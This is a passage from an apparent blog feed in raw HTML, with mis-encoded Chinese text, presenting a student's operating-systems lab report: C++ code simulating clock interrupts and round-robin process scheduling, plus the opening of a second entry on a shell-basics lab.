class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">time_caculate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> timer)</span> <span class="hljs-comment">//è®¡ç®—å½“å‰æ—¶é—´</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;ç°åœ¨æ—¶é—´æ˜¯ï¼š&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>;<br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="è¿›ç¨‹åˆå§‹åŒ–å‡½æ•°"><a class="markdownIt-Anchor" href="#è¿›ç¨‹åˆå§‹åŒ–å‡½æ•°"></a> è¿›ç¨‹åˆå§‹åŒ–å‡½æ•°</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">(queue&lt;PCB&gt; &amp;p)</span> <span class="hljs-comment">//è¿›ç¨‹åˆå§‹åŒ–ï¼Œç»™å®šä¸€äº›è¿›ç¨‹çš„åˆå€¼</span></span><br><span class="hljs-function"></span>&#123;<br>PCB ex[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>ex[i].id = i + <span class="hljs-number">1</span>;<br>ex[i].time_slice = <span class="hljs-number">2</span>;<br>ex[i].time_remain = <span class="hljs-number">2</span> + i;<br>p.<span class="hljs-built_in">push</span>(ex[i]);<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="è¿›ç¨‹ä¿å­˜å‡½æ•°"><a class="markdownIt-Anchor" href="#è¿›ç¨‹ä¿å­˜å‡½æ•°"></a> è¿›ç¨‹ä¿å­˜å‡½æ•°</h5><blockquote><p>ä¿å­˜è¿›ç¨‹çš„æ—¶é—´ç‰‡ä¿¡æ¯ï¼Œå…·ä½“å…¶ä»–ä¿¡æ¯çš„ä¿å­˜çœç•¥</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_save</span><span class="hljs-params">()</span> <span class="hljs-comment">//ä¸­æ–­å‘ç”Ÿæ—¶çš„è¿›ç¨‹ä¿å­˜</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨ä¿æŠ¤ç°åœºÂ·Â·Â·&quot;</span> &lt;&lt; endl;<br>process.time_remain--; <span class="hljs-comment">//æ¯äº§ç”Ÿä¸€æ¬¡æ—¶é’Ÿä¸­æ–­ç»å¤„ç†åï¼Œè¢«ä¸­æ–­è¿›ç¨‹æ—¶é—´å‡1</span><br>process.time_slice--;  <span class="hljs-comment">//æ—¶é—´ç‰‡ä¹Ÿå‡1</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;ç°åœºä¿æŠ¤å®Œæˆ&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="è¿›ç¨‹è°ƒåº¦å‡½æ•°"><a class="markdownIt-Anchor" href="#è¿›ç¨‹è°ƒåº¦å‡½æ•°"></a> è¿›ç¨‹è°ƒåº¦å‡½æ•°</h5><blockquote><p>åˆ†ä¸ºä¸‰ç§æƒ…å†µ</p><p>ç¬¬ä¸€ç§ä¸ºè¿›ç¨‹è¿è¡Œæ—¶é—´å·²å®Œæˆ</p><p>ç¬¬äºŒç§ä¸ºè¿›ç¨‹æ—¶é—´ç‰‡ç”¨å®Œ</p><p>è¿™ä¸¤ç§éƒ½éœ€è¦åˆ‡æ¢è¿›ç¨‹</p><p>ç¬¬ä¸‰ç§åˆ™æ˜¯æ—¶é—´ç‰‡å’Œè¿›ç¨‹å‰©ä½™æ—¶é—´å‡ä¸ä¸ºé›¶ï¼Œç»§ç»­è¿è¡Œå½“å‰è¿›ç¨‹</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ir, <span class="hljs-keyword">int</span> timer)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">if</span> (process.time_remain == <span class="hljs-number">0</span>)<br>ir = <span class="hljs-number">1</span>; <span class="hljs-comment">//æ ‡è®°è¿›ç¨‹å·²ç»“æŸæˆ–ä¸­æ–­ï¼Œéœ€è¦åˆ‡æ¢è¿›ç¨‹</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (process.time_slice == <span class="hljs-number">0</span>)<br>&#123;<br>ir = <span class="hljs-number">1</span>;<span class="hljs-comment">//å½“å‰è¿›ç¨‹å·²ç»“æŸæˆ–ä¸­æ–­ï¼Œéœ€è¦åˆ‡æ¢è¿›ç¨‹</span><br>process.time_slice = <span class="hljs-number">2</span>; <span class="hljs-comment">//æ¢å¤æ—¶é—´ç‰‡</span><br>p.<span class="hljs-built_in">push</span>(process);<span class="hljs-comment">//å†æ¬¡æ”¾å…¥å°±ç»ªé˜Ÿåˆ—</span><br>&#125;<br><span class="hljs-keyword">else</span><br>ir = <span class="hljs-number">-1</span>; <span class="hljs-comment">//å½“å‰è¿›ç¨‹ç»§ç»­è¿è¡Œ</span><br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">1</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå¤„ç†å™¨è°ƒåº¦Â·Â·Â·&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>process = p.<span class="hljs-built_in">front</span>();<br><span class="hljs-keyword">if</span> (!p.<span class="hljs-built_in">empty</span>())<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ‰€ä»¥è¿›ç¨‹å·²ç»æ‰§è¡Œå®Œæˆ,æ—¶é—´è¿‡å»äº†&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer); <span class="hljs-comment">//è¿›ç¨‹é˜Ÿåˆ—ä¸ºç©ºåˆ™ç»“æŸï¼Œè®¡ç®—æ—¶é—´</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">//è¿”å›0è¡¨ç¤ºç»“æŸç¨‹åº</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ir == <span class="hljs-number">-1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå¤„ç†å™¨è°ƒåº¦Â·Â·Â·&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç -2"><a class="markdownIt-Anchor" href="#æºä»£ç -2"></a> æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PCB</span> //è¿›ç¨‹ç»“æ„ä½“</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> time_slice; <span class="hljs-comment">//æ—¶é—´ç‰‡</span><br><span class="hljs-keyword">int</span> time_remain; <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´</span><br><span class="hljs-keyword">int</span> id; <span class="hljs-comment">//è¿›ç¨‹id</span><br>&#125;;<br><br>queue&lt;PCB&gt; p;  <span class="hljs-comment">//è¿›ç¨‹çš„å°±ç»ªé˜Ÿåˆ—</span><br>PCB process;   <span class="hljs-comment">//å½“å‰è¿›ç¨‹</span><br><span class="hljs-keyword">time_t</span> t;   <span class="hljs-comment">//å­˜å‚¨æ—¥å†æ—¶é—´ç±»å‹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span> <span class="hljs-comment">//ç”¨æ¥ä¿å­˜æ—¶é—´å’Œæ—¥æœŸçš„ç»“æ„</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">time_caculate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> timer)</span> <span class="hljs-comment">//è®¡ç®—å½“å‰æ—¶é—´</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;ç°åœ¨æ—¶é—´æ˜¯ï¼š&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>;<br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">(queue&lt;PCB&gt; &amp;p)</span> <span class="hljs-comment">//è¿›ç¨‹åˆå§‹åŒ–ï¼Œç»™å®šä¸€äº›è¿›ç¨‹çš„åˆå€¼</span></span><br><span class="hljs-function"></span>&#123;<br>PCB ex[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>ex[i].id = i + <span class="hljs-number">1</span>;<br>ex[i].time_slice = <span class="hljs-number">2</span>;<br>ex[i].time_remain = <span class="hljs-number">2</span> + i;<br>p.<span class="hljs-built_in">push</span>(ex[i]);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_save</span><span class="hljs-params">()</span> <span class="hljs-comment">//ä¸­æ–­å‘ç”Ÿæ—¶çš„è¿›ç¨‹ä¿å­˜</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨ä¿æŠ¤ç°åœºÂ·Â·Â·&quot;</span> &lt;&lt; endl;<br>process.time_remain--; <span class="hljs-comment">//æ¯äº§ç”Ÿä¸€æ¬¡æ—¶é’Ÿä¸­æ–­ç»å¤„ç†åï¼Œè¢«ä¸­æ–­è¿›ç¨‹æ—¶é—´å‡1</span><br>process.time_slice--;  <span class="hljs-comment">//æ—¶é—´ç‰‡ä¹Ÿå‡1</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;ç°åœºä¿æŠ¤å®Œæˆ&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ir, <span class="hljs-keyword">int</span> timer)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">if</span> (process.time_remain == <span class="hljs-number">0</span>)<br>ir = <span class="hljs-number">1</span>; <span class="hljs-comment">//æ ‡è®°è¿›ç¨‹å·²ç»“æŸæˆ–ä¸­æ–­ï¼Œéœ€è¦åˆ‡æ¢è¿›ç¨‹</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (process.time_slice == <span class="hljs-number">0</span>)<br>&#123;<br>ir = <span class="hljs-number">1</span>;<span class="hljs-comment">//å½“å‰è¿›ç¨‹å·²ç»“æŸæˆ–ä¸­æ–­ï¼Œéœ€è¦åˆ‡æ¢è¿›ç¨‹</span><br>process.time_slice = <span class="hljs-number">2</span>; <span class="hljs-comment">//æ¢å¤æ—¶é—´ç‰‡</span><br>p.<span class="hljs-built_in">push</span>(process);<span class="hljs-comment">//å†æ¬¡æ”¾å…¥å°±ç»ªé˜Ÿåˆ—</span><br>&#125;<br><span class="hljs-keyword">else</span><br>ir = <span class="hljs-number">-1</span>; <span class="hljs-comment">//å½“å‰è¿›ç¨‹ç»§ç»­è¿è¡Œ</span><br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">1</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå¤„ç†å™¨è°ƒåº¦Â·Â·Â·&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>process = p.<span class="hljs-built_in">front</span>();<br><span class="hljs-keyword">if</span> (!p.<span class="hljs-built_in">empty</span>())<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ‰€ä»¥è¿›ç¨‹å·²ç»æ‰§è¡Œå®Œæˆ,æ—¶é—´è¿‡å»äº†&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer); <span class="hljs-comment">//è¿›ç¨‹é˜Ÿåˆ—ä¸ºç©ºåˆ™ç»“æŸï¼Œè®¡ç®—æ—¶é—´</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">//è¿”å›0è¡¨ç¤ºç»“æŸç¨‹åº</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ir == <span class="hljs-number">-1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå¤„ç†å™¨è°ƒåº¦Â·Â·Â·&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> clock_alarm;<br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//ä¸­æ–­å¯„å­˜å™¨</span><br><br><span class="hljs-built_in">process_init</span>(p); <span class="hljs-comment">//åˆå§‹åŒ–è¿›ç¨‹</span><br><br><span class="hljs-built_in">time</span>(&amp;t);<br>cc = <span class="hljs-built_in">localtime</span>(&amp;t);<br><br>cout &lt;&lt; <span class="hljs-string">&quot;å¼€æœºæ—¶é—´ï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>cout &lt;&lt; <span class="hljs-string">&quot;å®šæ—¶é—¹é’Ÿçš„è®¾å®šå€¼ä¸ºï¼š&quot;</span>;<br>cin &gt;&gt; clock_alarm;<br>cout &lt;&lt; endl;<br><br>process = p.<span class="hljs-built_in">front</span>();<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">while</span> (clock_alarm != <span class="hljs-number">0</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;è¿›ç¨‹&quot;</span> &lt;&lt; process.id &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨æ‰§è¡Œ&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;å½“å‰è¿›ç¨‹å‰©ä½™çš„æ—¶é—´ç‰‡ï¼š&quot;</span> &lt;&lt; process.time_slice &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;å½“å‰è¿›ç¨‹å‰©ä½™æ‰§è¡Œæ—¶é—´ï¼š&quot;</span> &lt;&lt; process.time_remain &lt;&lt; endl;<br>counter++;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ˜¯å¦æœ‰ä¸­æ–­äº§ç”Ÿï¼Œ1æ˜¯ï¼Œ0å¦ï¼š&quot;</span>; <span class="hljs-comment">//æ¯è¾“å…¥ä¸€æ¬¡é¢‘ç‡è®¾ç½®ä¸º1s</span><br>cin &gt;&gt; ir;<br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æœªå‘ç”Ÿä¸­æ–­ï¼Œè¿›ç¨‹ç»§ç»­æ‰§è¡Œ&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">process_save</span>();<br>timer++;<br>clock_alarm--;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">process_schedule</span>(ir, timer) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;å®šæ—¶ç»“æŸï¼Œæ—¶é—´è¿‡å»äº†&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>clock_alarmè®¾å®šå€¼ä¸º4</p><p><img src="/posts/8a95bb2a/image-20211112115344801.png" alt="image-20211112115344801"></p><p>clock_alarmè®¾å®šå€¼ä¸º5</p><p><img src="/posts/8a95bb2a/image-20211112115544971.png" alt="image-20211112115544971"></p><p>å½“æ‰€æœ‰è¿›ç¨‹è¿è¡Œæ—¶é—´å°äºå®šæ—¶é—¹é’Ÿè®¾å®šå€¼æ—¶ï¼š</p><p><img src="/posts/8a95bb2a/image-20211112120044861.png" alt="image-20211112120044861"></p><p><img src="/posts/8a95bb2a/image-20211112120118837.png" alt="image-20211112120118837"></p><h3 id="äº”-å®éªŒæ€»ç»“"><a class="markdownIt-Anchor" href="#äº”-å®éªŒæ€»ç»“"></a> äº”ã€å®éªŒæ€»ç»“</h3><p>å¯¹äºåªæœ‰ä¸­æ–­çš„ç¨‹åºè®¾è®¡è¾ƒä¸ºç®€å•ï¼Œè®¾ç½®ä¸€ä¸ªå®šæ—¶æ—¶é’Ÿï¼Œç„¶åè¿›è¡Œä¸­æ–­åˆ¤æ–­ï¼Œå½“è¾“å…¥ä¸º1æ—¶ï¼Œä¸­æ–­è¿›ç¨‹ï¼Œå®šæ—¶é—¹é’Ÿå‡ä¸€ï¼Œè¾“å…¥ä¸º0æ—¶ï¼Œç»§ç»­æ‰§è¡Œå½“å‰è¿›ç¨‹ã€‚</p><p>å¯¹äºæ€è€ƒé¢˜ï¼Œéœ€è¦è€ƒè™‘æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ï¼Œç¨‹åºä¸»è¦æ€è·¯å°±æ˜¯å½“è¿›ç¨‹è¿è¡Œæ—¶é—´æˆ–è€…æ—¶é—´ç‰‡ç»“æŸæ—¶ï¼Œåˆ‡æ¢è¿›ç¨‹ï¼Œå¦åˆ™ç»§ç»­æ‰§è¡Œå½“å‰è¿›ç¨‹ã€‚</p><p>è¿™ä¸ªå®éªŒç›¸å¯¹è¾ƒä¸ºå®¹æ˜“ï¼Œåªè€ƒè™‘äº†å°±ç»ªé˜Ÿåˆ—å’Œå½“å‰è¿è¡Œè¿›ç¨‹ã€‚</p><p>é€šè¿‡è¿™æ¬¡æ¨¡æ‹Ÿå®éªŒï¼Œæˆ‘äº†è§£äº†ä¸­æ–­çš„è¿‡ç¨‹ä»¥åŠä¸­æ–­å¤„ç†ç¨‹åºçš„ä½œç”¨ï¼Œå½“CPUæ”¶åˆ°ä¸­æ–­æˆ–è€…å¼‚å¸¸çš„ä¿¡å·æ—¶ï¼Œå®ƒä¼šæš‚åœæ‰§è¡Œå½“å‰çš„ç¨‹åºæˆ–ä»»åŠ¡ç„¶åé€šè¿‡è¿›ç¨‹è°ƒåº¦å‡½æ•°è¿›è¡Œè¿›ç¨‹åˆ‡æ¢ã€‚</p><p>åŒæ—¶ä¹Ÿè¿›è¡Œäº†è®¸ä¹…æ²¡å†™è¿‡çš„C++ç¼–ç¨‹ï¼Œä»£ç å¤ªä¹…æ²¡ç¼–æœç„¶ä¼šç”Ÿç–ï¼Œå¾ˆå¤šç®€å•çš„æ€è·¯æ€»æ˜¯æƒ³ä¸æ¸…æ¥šï¼Œä½†æ€»ç®—æœ€åé¡ºåˆ©å®Œæˆäº†ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šæ”¶è·çš„ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒäºŒ</title>
    <link href="/posts/da9b6b33/"/>
    <url>/posts/da9b6b33/</url>
    
    <content type="html"><![CDATA[<h1 id="æ“ä½œç³»ç»Ÿç¬¬äºŒæ¬¡å®éªŒ"><a class="markdownIt-Anchor" href="#æ“ä½œç³»ç»Ÿç¬¬äºŒæ¬¡å®éªŒ"></a> æ“ä½œç³»ç»Ÿç¬¬äºŒæ¬¡å®éªŒ</h1><h2 id="å®éªŒ4-shellåˆæ­¥"><a class="markdownIt-Anchor" href="#å®éªŒ4-shellåˆæ­¥"></a> å®éªŒ4 shellåˆæ­¥</h2><h3 id="ä¸€-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒç›®çš„"></a> ä¸€ã€å®éªŒç›®çš„</h3><ul><li>ç†Ÿæ‚‰shellçš„åŸºæœ¬æ“ä½œ</li><li>ä½¿ç”¨LINUXä¸­æœ€å¸¸ç”¨çš„æ•°æ®å¤„ç†å‘½ä»¤</li></ul><h3 id="äºŒ-å®éªŒè¦æ±‚"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒè¦æ±‚"></a> äºŒã€å®éªŒè¦æ±‚</h3><ul><li>ä½¿ç”¨é€šé…ç¬¦æ¥è¿›è¡Œæ–‡ä»¶åçš„æŸ¥æ‰¾</li><li>é‡å®šå‘æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯è¾“å‡º</li><li>ä½¿ç”¨ç®¡é“æ“ä½œï¼Œå°†ä¸€ä¸ªè¿›ç¨‹çš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªè¿›ç¨‹çš„è¾“å…¥</li><li>ä½¿ç”¨ç¾¤å‘½ä»¤å’Œå‘½ä»¤è¡Œç»­è¡Œç¬¦</li><li>åœ¨æŒ‡å®šçš„ç›®å½•ä¸­ï¼Œå¯¹æ»¡è¶³æ¡ä»¶çš„æ–‡ä»¶åè¿›è¡Œé€’å½’æŸ¥æ‰¾</li><li>äº†è§£viç¼–è¾‘å™¨çš„åŸºæœ¬ç”¨æ³•</li><li>åœ¨æ–‡æœ¬æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾ç¬¦åˆæŒ‡å®šæ¨¡å¼çš„æ–‡æœ¬è¡Œ</li><li>å°†æ–‡æœ¬æ–‡ä»¶ä¸­çš„å„è¡Œï¼ŒæŒ‰é¡ºåºæ’åˆ—</li><li>æ˜¾ç¤ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å‰å‡ è¡Œæˆ–è€…åå‡ è¡Œ</li></ul><h3 id="ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†"></a> ä¸‰ã€å®éªŒé¢„å¤‡çŸ¥è¯†</h3><h4 id="1-shellç®€ä»‹"><a class="markdownIt-Anchor" 